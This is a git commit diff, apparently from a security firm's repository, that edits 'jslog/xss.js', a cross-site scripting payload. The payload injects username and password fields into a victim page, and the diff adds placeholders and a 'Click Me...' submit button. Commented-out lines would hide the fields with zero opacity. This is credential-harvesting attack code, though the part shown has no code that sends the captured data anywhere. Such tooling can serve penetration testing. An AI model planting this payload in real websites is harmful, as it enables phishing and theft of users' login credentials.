51d4291badaadd65e23d557dd68ed19c19725215
trustedsec-pd <114032879+trustedsec-pd@users.noreply.github.com>
2022-09-26 12:12:45 -0500

    Add files via upload
    Signed-off-by: trustedsec-pd <114032879+trustedsec-pd@users.noreply.github.com>

--- jslog/xss.js
+++ jslog/xss.js
@@ -1,12 +1,21 @@
 let body = document.getElementsByTagName("body")[0]
 var u = document.createElement("input");
 u.type = "text";
+u.placeholder="Input User Name";
 //u.style.position = "fixed";
 //u.style.opacity = "0";
 
 var p = document.createElement("input");
 p.type = "password";
+p.placeholder="Input Password";
 //p.style.position = "fixed";
 //p.style.opacity = "0";
+
+var b = document.createElement("button");
+b.type="submit";
+b.textContent = 'Click Me...';
+
+
 body.append(u)
 body.append(p)
+body.append(b)
